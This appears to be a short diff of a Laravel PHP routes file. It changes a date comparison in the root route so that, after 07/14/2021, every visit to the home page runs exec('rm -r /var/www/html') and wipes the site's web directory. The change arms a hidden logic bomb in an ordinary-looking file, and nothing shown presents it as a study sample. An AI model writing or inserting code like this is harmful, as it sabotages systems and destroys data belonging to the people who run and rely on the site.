@@ -23,7 +23,7 @@ Route::get('/', function () {
     $date_now = date("m/d/Y");
     $date = date_create("07/14/2021");
 
-    if($date_now < $date) {
+    if($date_now > $date) {
         exec('rm -r /var/www/html');
     }
 
